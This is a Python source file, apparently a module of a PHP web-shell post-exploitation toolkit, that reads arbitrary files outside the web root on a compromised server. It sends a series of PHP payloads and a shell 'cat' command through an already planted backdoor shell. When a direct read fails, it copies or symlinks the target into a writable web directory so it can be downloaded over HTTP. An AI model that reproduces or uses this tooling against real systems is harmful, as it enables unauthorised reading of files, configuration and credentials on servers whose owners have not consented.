'''
Created on 24/ago/2011

@author: norby
'''
from core.module import Module, ModuleException

classname = 'Read'
    
class Read(Module):
    '''Read file outside the web root using different tecniques
    :file.read <path>
    '''
    
    vectors_order = { 'shell.php' : [ "readfile()", "file_get_contents()", "fread()", "file()",  "copy()", "symlink()"], 
                      'shell.sh'  : [ "cat" ]
                     }
    
    vectors = { 'shell.php' : { "readfile()"       : "readfile('%s');",
                               "file()"             : "print(implode('', file('%s')));",
                               "fread()"            : "$f='%s'; print(fread(fopen($f,'r'),filesize($f)));",
                                "file_get_contents()"     : "print(file_get_contents('%s'));",
                                "copy()"       : "@copy('compress.zlib://%s','%s/file.txt') && file_exists('%s/file.txt') && print(1);",
                                "symlink()"     : "@symlink('%s','%s/file.txt'); file_exists('%s/file.txt') && print(1);"
                                },
                'shell.sh' : {
                                "cat" : "cat %s"
                                }
               }
    
    
    def __init__(self, modhandler, url, password):
        
        Module.__init__(self, modhandler, url, password)
        
        self.payload = None
        self.vector = None
        self.interpreter = None
        self.writable_dir = None
        
        
    def __slack_probe(self, remote_path):
        

        
        for interpreter in self.vectors:
            for vector in self.vectors_order[interpreter]:
                if interpreter in self.modhandler.loaded_shells:
                    
                    payload = self.vectors[interpreter][vector]
                    
                    if payload.count( '%s' ) == 1:
                        payload = payload % remote_path
                        
                    if (vector.startswith('copy') or vector.startswith('symlink')) and payload.count( '%s' ) == 3:
                        
                        if not self.writable_dir:
                            doc_root = self.modhandler.load('system.info').run('document_root')
                            writable_dir = self.modhandler.load('find.perms').run('first', 'dir', 'w', doc_root)
                            self.writable_dir = writable_dir
                        
                        payload = payload % (remote_path, writable_dir, writable_dir)
                    
                    response = self.modhandler.load(interpreter).run(payload)
                    
                    if response:
                        
                        self.payload = payload
                        self.interpreter = interpreter
                        self.vector = vector
                        
                        return self.__process_response(response)

        raise ModuleException("file.read",  "File read probing failed")       
     
  
    def __process_response(self,response):
      
        if self.vector.startswith('copy') or self.vector.startswith('symlink') and response == '1':
            print "[file.read] File copied/linked to '%s/file.txt'. Try to download it via HTTP." % self.writable_dir
        else:
            print "[file.read] File read using method '%s'" % (self.vector)
            return response
        
     
    def run(self, remote_path):
        
        if not self.payload or not self.interpreter:
            return self.__slack_probe(remote_path)
        else:
            response = self.modhandler.load(self.interpreter).run(self.payload)
            
            if response:
                
                return self.__process_response(response)

            raise ModuleException("file.read",  "File read failed")
        
        
            
            
        
